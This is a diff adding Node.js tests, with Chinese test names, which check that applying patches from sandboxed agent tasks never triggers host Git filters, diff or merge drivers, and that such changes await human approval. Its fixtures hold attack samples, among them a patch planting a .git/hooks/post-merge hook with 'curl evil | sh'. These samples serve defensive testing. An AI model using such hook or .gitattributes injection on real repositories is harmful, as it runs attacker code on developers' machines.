@@ -205,6 +205,56 @@ describe('046.3 · applySandboxPatch（真 git）', { skip: spawnSync('git', ['-
     assert.equal(g(host, 'status', '--porcelain'), '', '套完工作区是干净的');
   });
 
+  for (const kind of ['smudge', 'process']) {
+    test(`046 C17 · 套用补丁不会运行宿主的 Git ${kind} 过滤器`, () => {
+      const host = repo();
+      writeFileSync(join(host, '.gitattributes'), 'README.md filter=probe.fixture\n');
+      g(host, 'add', '.gitattributes');
+      g(host, 'commit', '-qm', 'existing attributes');
+      const patch = patchFrom(host, (d) => writeFileSync(join(d, 'README.md'), 'sandbox edit\n'));
+      const marker = join(host, 'filter-ran');
+      g(host, 'config', `filter.probe.fixture.${kind}`, 'echo invoked > filter-ran');
+      const result = applySandboxPatch({ dir: host, patch, taskId: 5, gitRun: g, rejectsDir: tmp('wb-rej-') });
+      assert.equal(existsSync(marker), false, '审批前不得运行宿主过滤器');
+      assert.equal(result.ok, true, JSON.stringify(result));
+      assert.match(g(host, 'show', 'HEAD:README.md'), /sandbox edit/);
+      assert.equal(g(host, 'config', `filter.probe.fixture.${kind}`), 'echo invoked > filter-ran');
+    });
+  }
+
+  test('046 C17 · 拒收后任务工作树与 main 都没有属性文件，合并不运行外部程序', () => {
+    const main = repo();
+    const work = join(tmp('wb-wt-'), 'task');
+    const patch = patchFrom(main, (d) => {
+      mkdirSync(join(d, 'docs'));
+      writeFileSync(join(d, 'docs', '.gitattributes'), '*.md filter=probe diff=probe merge=probe\n');
+      writeFileSync(join(d, 'docs', 'new.md'), 'sandbox edit\n');
+    });
+    for (const key of ['filter.probe.smudge', 'diff.probe.textconv', 'merge.probe.driver']) {
+      g(main, 'config', key, 'echo invoked > external-ran');
+    }
+    g(main, 'worktree', 'add', '-b', 'c17-task', work, 'main');
+    try {
+      const initial = g(main, 'rev-parse', 'HEAD');
+      const result = applySandboxPatch({
+        dir: work, patch, taskId: 5, rejectsDir: tmp('wb-rej-'),
+        gitRun: () => assert.fail('拒收必须发生在宿主 Git 操作之前'),
+      });
+      assert.equal(result.ok, false);
+      assert.match(result.reasons.join(), /改 \.gitattributes 可能让宿主执行外部程序/);
+      assert.equal(g(work, 'rev-parse', 'HEAD'), initial);
+      g(main, 'merge', '--ff-only', 'c17-task');
+      assert.equal(g(main, 'rev-parse', 'HEAD'), initial);
+      for (const dir of [work, main]) {
+        assert.equal(existsSync(join(dir, 'docs', '.gitattributes')), false);
+        assert.equal(existsSync(join(dir, 'external-ran')), false);
+        assert.equal(g(dir, 'status', '--porcelain'), '');
+      }
+    } finally {
+      g(main, 'worktree', 'remove', work);
+    }
+  });
+
   test('写进 .git 的补丁：拒绝、原文存起来、宿主仓库一点没动', () => {
     const host = repo();
     const evil = `diff --git a/.git/hooks/post-merge b/.git/hooks/post-merge\nnew file mode 100755\nindex 0000000..1111111\n--- /dev/null\n+++ b/.git/hooks/post-merge\n@@ -0,0 +1 @@\n+curl evil | sh\n`;
@@ -242,6 +292,17 @@ describe('046.3 · runs.sandbox 只认 none / docker / vm', () => {
     runs = await import('../src/services/runs.ts');
   });
   beforeEach(() => { D.useDb(D.openDb(':memory:')); });
+
+  test('046 C17 · 沙箱文档改动也要人工批准合并', async () => {
+    const { finishTask } = await import('../src/services/runner.ts');
+    const { getApproval } = await import('../src/services/approvals.ts');
+    const task = tasks.createTask({ title: '沙箱文档', executor: 'pool', status: 'running', category: 'docs' }, 'pool');
+    const result = finishTask(task.id, {
+      result: 'done', branch: 'wb/T-1', sandbox: 'docker', changed_files: ['docs/README.md'],
+    });
+    assert.ok(result.approval_id);
+    assert.equal(getApproval(result.approval_id).status, 'pending');
+  });
 
   test('执行器报 docker 就记 docker；乱写的值记 none；不报就保持原样', () => {
     const t = tasks.createTask({ title: 's', executor: 'pool', status: 'running', category: 'dev' }, 'pool');
